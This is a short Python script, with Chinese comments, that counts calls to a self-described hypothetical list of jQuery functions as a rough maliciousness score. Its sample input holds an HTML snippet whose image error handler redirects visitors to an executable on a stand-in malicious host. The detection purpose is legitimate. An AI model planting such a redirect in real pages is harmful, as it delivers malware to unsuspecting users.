import re

# jQuery函数很可能包含恶意代码

# 假设的函数列表（并没有真正从jQuery API中提取）
html_css_functions = ["addClass", "css", "hide", "show"]
event_functions = ["on", "trigger", "off", "error"]
effect_functions = ["animate", "fadeIn", "fadeOut"]
traversing_functions = ["find", "closest", "parent", "siblings"]
misc_functions = ["ajax", "globalEval"]

functions_list = [
    html_css_functions,
    event_functions,
    effect_functions,
    traversing_functions,
    misc_functions,
]


# 统计函数
def calculate_score(js_content: str) -> int:
    all_count = 0
    for functions in functions_list:
        for func in functions:
            # 使用正则表达式匹配函数调用模式
            pattern = r"\b" + re.escape(func) + r"\s*\("
            matches = re.findall(pattern, js_content)
            count = len(matches)
            if count > 0:
                # print(f"{func} count: {count}")
                all_count += count  # 累加所有匹配到的函数调用次数
    return all_count


# 示例代码
code = """
<img alt="Book" id="book" scr="www.invalidaddress.com"/>
<script>
$('#book').error(function() {
window.location.href = 'http://maliciousWebsite.com/virus.exe';
})
</script>
"""

res = calculate_score(code)
print(f"jQuery functions count: {res}")
